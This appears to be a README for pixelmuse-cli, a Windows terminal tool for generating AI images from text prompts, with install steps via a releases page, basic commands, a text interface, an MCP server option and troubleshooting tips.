# 🖼️ pixelmuse-cli - Generate AI images from the terminal

[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-brightgreen?style=for-the-badge)](https://github.com/mysadt/pixelmuse-cli/releases)

---

## 🎯 What is pixelmuse-cli?

pixelmuse-cli lets you create AI-generated images simply by typing commands in your computer’s terminal. It works without a traditional graphical interface, making it light and fast. Use it to generate images from text descriptions using popular AI models like Flux, Imagen, and Recraft.  

You can run it directly from your Windows PC and start creating pictures with words. It also includes a simple text user interface (TUI) and a server option (MCP) if you want to connect multiple users or apps.  

---

## 💻 System Requirements

To run pixelmuse-cli on Windows, your PC needs:

- Windows 10 or later (64-bit)
- At least 4 GB of RAM (8 GB recommended)
- 500 MB free disk space for the app
- An internet connection for AI model access
- Terminal program (Command Prompt or PowerShell)

It does not need any special hardware like a graphics card. The tool runs mainly on your CPU.

---

## 🚀 Getting Started: Download and Run pixelmuse-cli

1. Click the green button below or go to the official release page to get the latest Windows installer.

[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-blue?style=for-the-badge)](https://github.com/mysadt/pixelmuse-cli/releases)

2. On the releases page, find the latest version and look for the Windows installer file. It will be named like `pixelmuse-cli-setup.exe`.

3. Download the setup file to your computer.

4. Once downloaded, double-click the setup file to start the installation.

5. Follow the on-screen prompts to install pixelmuse-cli on your PC. Choose default options unless you want to change the installation folder.

6. After installation, open your terminal program:

   - Press Windows key + R, type `cmd`, and press Enter to open Command Prompt.

   - Or press Windows key + X and select “Windows PowerShell”.

7. In the terminal window, type `pixelmuse` and press Enter. This will launch the pixelmuse-cli program.

---

## 🔧 How to Use pixelmuse-cli

Once running, you interact with pixelmuse-cli through commands. Here is how you can generate an image:

1. Type a command like this:

   ```
   pixelmuse generate "a sunset over mountains"
   ```

2. Press Enter.

3. The tool will send your text to an AI model and start creating the image.

4. When done, pixelmuse-cli saves the image file in the folder you started it from. It will show the file name and location in the terminal.

---

## 🖥️ Using the Text User Interface (TUI)

If you prefer a simple menu-driven way to work:

1. Run the command:

   ```
   pixelmuse tui
   ```

2. Use your keyboard to navigate the menu.

3. Select options to enter text prompts and choose AI models.

4. View the status of running jobs and save images.

This mode makes the tool easier for users who do not want to remember commands.

---

## 🌐 Running the MCP Server

pixelmuse-cli includes an MCP (Model Context Protocol) server. This lets other devices or apps send image generation requests to your PC.

To start the server:

1. Run this command in the terminal:

   ```
   pixelmuse mcp-server
   ```

2. It will run a server on your local network by default.

3. Other devices on the same network can now connect to your PC with MCP-compatible clients to generate images remotely.

---

## ⚙️ Common Commands Reference

| Command                    | What It Does                                      |
|----------------------------|--------------------------------------------------|
| `pixelmuse generate "text"`| Generate an image from the text prompt            |
| `pixelmuse tui`             | Start the text user interface                      |
| `pixelmuse mcp-server`      | Start the server to accept remote requests        |
| `pixelmuse --help`          | Show all available commands and options            |

---

## 🗂️ File Locations

- Generated images save to the current folder unless you specify a different path.

- Configuration files store in your user folder under `.pixelmuse`.

---

## 🔄 Updating pixelmuse-cli

To get the latest features and fixes:

1. Visit the [releases page](https://github.com/mysadt/pixelmuse-cli/releases).

2. Download the newest Windows installer file.

3. Run the installer. It will update your existing version without affecting your files.

---

## ❓ Troubleshooting

- If `pixelmuse` command is not recognized, ensure the installation folder is in your system’s PATH variable. Re-run the installer if needed.

- Check your internet connection if image generation fails. The AI models run online.

- Close other heavy apps to free memory for better performance.

- Restart your PC if the program behaves unexpectedly.

---

## 💡 Tips for Best Results

- Use clear and detailed text prompts describing the image you want.

- Try different AI models using TUI for varied styles.

- Organize your generated images into folders to avoid confusion.

---

## 🔗 Download pixelmuse-cli

Get the latest version from the official GitHub page:

[![Download pixelmuse-cli](https://img.shields.io/badge/Download-pixelmuse%20cli-brightgreen?style=for-the-badge)](https://github.com/mysadt/pixelmuse-cli/releases)